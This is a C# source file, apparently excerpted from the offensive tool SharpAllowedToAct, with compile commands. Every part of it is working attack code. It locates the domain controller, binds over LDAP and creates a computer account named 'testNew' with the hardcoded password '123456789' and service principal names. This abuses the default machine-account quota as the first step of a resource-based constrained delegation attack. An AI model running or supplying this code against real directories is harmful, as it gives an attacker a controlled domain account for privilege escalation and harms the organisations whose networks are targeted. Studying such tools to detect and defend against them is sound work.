/*
Reference:https://github.com/pkb1s/SharpAllowedToAct
This code is just part of SharpAllowedToAct.
It can be used to add a Machine Account(User:testNew,Password:123456789).
This code can be complied by csc.exe or Visual Studio.
Supprot .Net 3.5 or later.
Complie:
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe AddMachineAccountofDomain.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll
or
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe AddMachineAccountofDomain.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll

*/


using System;
using System.Text;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace AddMachineAccount
{
    class Program
    {
        static void Main(string[] args)
        {
            String DomainController = "";
            String Domain = "";
            String MachineAccount = "testNew";
            String DistinguishedName = "";
            String password_cleartext = "123456789";
 
            System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
            if (DomainController == String.Empty || Domain == String.Empty)
            {
                try
                {
                    current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                }
                catch
                {
                    Console.WriteLine("[!] Cannot enumerate domain.\n");
                    return;
                }

            }

            if (DomainController == String.Empty)
            {
                DomainController = current_domain.PdcRoleOwner.Name;
            }

            if (Domain == String.Empty)
            {
                Domain = current_domain.Name;
            }

            Domain = Domain.ToLower();

            String machine_account = MachineAccount;
            String sam_account = "";
            if (MachineAccount.EndsWith("$"))
            {
                sam_account = machine_account;
                machine_account = machine_account.Substring(0, machine_account.Length - 1);
            }
            else
            {
                sam_account = machine_account + "$";
            }


            String distinguished_name = DistinguishedName;
            String victim_distinguished_name = DistinguishedName;
            String[] DC_array = null;

            distinguished_name = "CN=" + machine_account + ",CN=Computers";
            DC_array = Domain.Split('.');

            foreach (String DC in DC_array)
            {
                distinguished_name += ",DC=" + DC;
                victim_distinguished_name += ",DC=" + DC;
            }

            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            Console.WriteLine("[+] New SAMAccountName = " + sam_account);
            Console.WriteLine("[+] Distinguished Name = " + distinguished_name);

            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            System.DirectoryServices.Protocols.LdapConnection connection = null;

            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);

            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();

            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + password_cleartext + "\"")),
                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)

            });

            try
            {
                connection.SendRequest(request);
                Console.WriteLine("[+] Machine account " + machine_account + " added");
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.)");
                Console.WriteLine("[-] Exception: " + ex.Message);
                return;
            }

        }

    }
}


